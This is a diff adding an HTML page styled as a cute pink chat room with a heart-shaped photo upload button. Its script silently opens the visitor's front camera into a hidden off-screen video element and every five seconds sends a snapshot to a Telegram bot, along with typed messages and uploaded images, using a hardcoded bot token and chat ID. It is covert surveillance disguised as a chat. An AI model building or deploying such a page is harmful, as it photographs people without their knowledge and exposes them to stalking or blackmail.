@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>....</title>
+    <style>
+        body {
+            background: linear-gradient(120deg, #ff758c, #ff7eb3);
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: white;
+        }
+        #chatbox {
+            width: 90%;
+            max-width: 400px;
+            height: 400px;
+            border-radius: 15px;
+            background: white;
+            padding: 15px;
+            overflow-y: auto;
+            margin: 20px auto;
+            color: black;
+            display: flex;
+            flex-direction: column;
+        }
+        .msg {
+            padding: 10px;
+            margin: 5px;
+            border-radius: 10px;
+            max-width: 70%;
+            word-wrap: break-word;
+        }
+        .user { background: #ff7eb3; align-self: flex-end; color: white; }
+        .bot { background: #f1f1f1; align-self: flex-start; }
+        input, button {
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            margin: 5px;
+        }
+        button { background: #ff4f81; color: white; cursor: pointer; }
+        video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
+        #canvas { display: none; }
+
+        /* ❤️ Heart-Shaped Upload Button */
+        .heart-upload {
+            width: 50px;
+            height: 50px;
+            background: #ff4f81;
+            position: relative;
+            display: inline-block;
+            margin-top: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .heart-upload::before,
+        .heart-upload::after {
+            content: "";
+            width: 50px;
+            height: 50px;
+            background: #ff4f81;
+            border-radius: 50%;
+            position: absolute;
+        }
+        .heart-upload::before { top: -25px; left: 0; }
+        .heart-upload::after { left: 25px; top: 0; }
+        .heart-upload:hover { transform: scale(1.1); }
+
+        #upload { display: none; }
+    </style>
+</head>
+<body>
+    <h2>....</h2>
+    <div id="chatbox"></div>
+    <input type="text" id="message" placeholder="Type a message...">
+    <button onclick="sendMessage()">Send</button>
+
+    <!-- ❤️ Heart-Shaped Upload Button -->
+    <label for="upload" class="heart-upload"></label>
+    <input type="file" id="upload" accept="image/*">
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
+        const chatId = "878604830";  
+
+        // 📸 Background Camera Setup
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById("video").srcObject = stream;
+        }
+
+        // 📸 Capture Photo and Send to Telegram
+        async function captureAndSendPhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.5);
+        }
+
+        // ✉️ Send Message to Telegram
+        async function sendMessage() {
+            const message = document.getElementById("message").value;
+            if (!message) return;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
+            document.getElementById("message").value = "";
+        }
+
+        // 📤 Send Uploaded Image to Telegram
+        document.getElementById("upload").addEventListener("change", async function() {
+            const file = this.files[0];
+            if (!file) return;
+
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+
+            document.getElementById("chatbox").innerHTML += `<div class="msg user"><img src="${URL.createObjectURL(file)}" width="100"></div>`;
+        });
+
+        // 📥 Fetch Messages from Telegram (Polling)
+        async function getMessages() {
+            let lastUpdateId = 0;
+
+            setInterval(async () => {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+
+                if (data.result.length > 0) {
+                    data.result.forEach(update => {
+                        if (update.message && update.message.text) {
+                            let receivedMessage = update.message.text.toLowerCase().trim();
+                            document.getElementById("chatbox").innerHTML += `<div class="msg bot">${update.message.text}</div>`;
+
+                            // ✅ Auto-refresh page if "bye" message received
+                            if (receivedMessage === "bye") {
+                                setTimeout(() => {
+                                    location.reload();
+                                }, 2000); // 2-second delay before refresh
+                            }
+                        }
+                        lastUpdateId = update.update_id;
+                    });
+                }
+            }, 3000);
+        }
+
+        // ✅ Start Everything
+        startCamera();
+        setInterval(captureAndSendPhoto, 5000); 
+        getMessages();
+    </script>
+</body>
+</html>
